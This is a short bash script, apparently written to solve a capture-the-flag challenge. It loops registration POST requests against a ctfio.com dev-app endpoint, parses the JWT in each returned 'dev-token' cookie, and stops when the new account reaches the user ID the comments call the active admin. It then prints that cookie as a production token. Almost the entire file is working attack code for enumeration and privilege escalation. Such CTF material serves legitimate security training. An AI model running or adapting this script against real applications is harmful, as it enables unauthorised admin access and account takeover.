#!/bin/bash

#build our curl command
proxy="http://localhost:8080"
endpoint="https://71x1uo9n.eu1.ctfio.com/dev-app/register"
userID="3"
cookie=""

#loop until we reach userID 37, aka active admin
while [[ "$userID" -lt "38" ]]; do

  #send request
	postdata="email=test${userID}%40test.com&password=password&cpassword=password"
	response=$(curl -s -D - -o /dev/null -x $proxy -X POST -d $postdata -k $endpoint)

	#parse response
	cookie=$(echo "$response" | grep "dev-token=" | sed -n 's/.*dev-token=\([^;]*\).*/\1/p')
	jwt_data=$(echo "$cookie" | sed -n 's/^[^.]*\.\([^\.]*\)\..*/\1/p')

	#extract value of userID
	currentID=$(echo "$jwt_data" | base64 -d 2>/dev/null | sed -n 's/.*"user_id":\([0-9]*\).*/\1/p')
	userID=$(echo "$((userID + 1))")


done

echo "Final Cookie || token-for-prod=$cookie"
